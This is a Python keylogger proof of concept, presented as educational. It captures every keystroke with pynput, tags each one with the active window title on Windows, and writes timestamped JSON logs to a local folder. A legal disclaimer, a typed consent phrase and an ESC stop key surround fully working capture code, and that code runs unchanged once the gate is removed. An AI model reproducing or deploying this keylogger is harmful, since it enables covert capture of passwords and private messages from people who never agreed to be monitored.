"""
⚠️ EDUCATIONAL KEYLOGGER PoC - AUTHORIZED USE ONLY

This tool logs keystrokes for authorized security testing and education.
Unauthorized keylogging is ILLEGAL under CFAA, ECPA, and similar laws.

USE ONLY ON:
- Systems you own
- Test environments with explicit permission
- Your own device for learning

Author: [Your Name]
Date: [Date]
Purpose: Security awareness & educational demonstration
"""

import sys
import json
import os
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import platform

# ============================================================================
# CONFIGURATION
# ============================================================================

LOG_DIRECTORY = Path("./logs")
LOG_FILE = LOG_DIRECTORY / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
WINDOW_LOG_FILE = LOG_DIRECTORY / f"windows_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

# Create logs directory if it doesn't exist
LOG_DIRECTORY.mkdir(exist_ok=True)

# ============================================================================
# LEGAL DISCLAIMER & CONSENT
# ============================================================================

def print_disclaimer():
    """Print legal disclaimer and get explicit user consent"""
    print("\n" + "="*70)
    print("⚠️  EDUCATIONAL KEYLOGGER PoC - READ CAREFULLY")
    print("="*70 + "\n")
    
    print("🚨 LEGAL WARNING:")
    print("─" * 70)
    print("Unauthorized keylogging is ILLEGAL under:")
    print("  • Computer Fraud and Abuse Act (CFAA) - USA")
    print("  • Electronic Communications Privacy Act (ECPA) - USA")
    print("  • Computer Misuse Act - UK & similar laws worldwide")
    print("  • Penalties: Federal charges, 10-20 years prison, $100K+ fines")
    print("─" * 70 + "\n")
    
    print("✅ LEGAL USES (Only these):")
    print("  • Your own computer (learning purposes)")
    print("  • Authorized security testing with written permission")
    print("  • Corporate/school security labs")
    print("  • Academic research under supervision\n")
    
    print("❌ ILLEGAL USES (Never do these):")
    print("  • Spying on others without consent")
    print("  • Stealing credentials or personal data")
    print("  • Unauthorized access to systems")
    print("  • Deploying on other people's devices\n")
    
    print("📋 THIS PoC:")
    print("  • Logs keystrokes LOCALLY ONLY (no internet transmission)")
    print("  • Tracks active window titles (context awareness)")
    print("  • Creates timestamped JSON logs")
    print("  • Requires explicit user confirmation before starting\n")
    
    print("="*70)
    
    # Explicit consent requirement
    response = input("\n⚠️  I understand the legal implications and will only use this ")
    response += input("   on AUTHORIZED systems.\n   Type 'YES I UNDERSTAND' to continue: ")
    
    if response.strip() != "YES I UNDERSTAND":
        print("\n❌ Keylogger cancelled. Exiting.")
        sys.exit(1)
    
    print("✅ Starting keylogger. Press ESC to stop.\n")
    return True

# ============================================================================
# WINDOW TRACKING (Windows only)
# ============================================================================

def get_active_window():
    """Get the currently active window title (Windows only)"""
    try:
        if platform.system() == "Windows":
            import win32gui
            window_handle = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window_handle)
            return window_title if window_title else "Unknown"
        else:
            # For Linux/Mac, this would require additional setup
            return "Window tracking not available on this OS"
    except Exception as e:
        return f"Error getting window: {str(e)}"

# ============================================================================
# KEYSTROKE LOGGING
# ============================================================================

current_window = {"title": "Unknown", "changed_at": datetime.now()}
key_count = 0

def on_press(key):
    """Handle key press events"""
    global current_window, key_count
    
    try:
        # Get current window
        window_title = get_active_window()
        
        # Log if window changed
        if window_title != current_window["title"]:
            current_window = {
                "title": window_title,
                "changed_at": datetime.now().isoformat()
            }
        
        # Determine key type
        try:
            char = key.char
            key_type = "character"
        except AttributeError:
            char = str(key)
            key_type = "special"
        
        # Create log entry
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "key": char,
            "type": key_type,
            "window": current_window["title"],
            "purpose": "educational_monitoring"
        }
        
        # Log to JSON file
        with open(LOG_FILE, "a") as f:
            json.dump(log_entry, f)
            f.write("\n")
        
        key_count += 1
        
        # Print progress (every 50 keys)
        if key_count % 50 == 0:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Logged {key_count} keys | "
                  f"Window: {current_window['title'][:40]}")
    
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """Handle key release - ESC stops the logger"""
    try:
        if key == keyboard.Key.esc:
            print("\n" + "="*70)
            print(f"✅ Keylogger stopped.")
            print(f"📊 Statistics:")
            print(f"   Total keys logged: {key_count}")
            print(f"   Log file: {LOG_FILE}")
            print(f"   Window log: {WINDOW_LOG_FILE}")
            print("="*70 + "\n")
            return False  # Stop listener
    except AttributeError:
        pass

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main function - starts the keylogger"""
    
    print("\n")
    print_disclaimer()
    
    print(f"📝 Logging to: {LOG_FILE}")
    print(f"🪟 Window tracking: {get_active_window()}\n")
    print("Keys are being logged. Press ESC to stop.\n")
    
    # Set up keyboard listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Keep the listener running
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\n⚠️  Interrupted by user.")
        listener.stop()

if __name__ == "__main__":
    main()
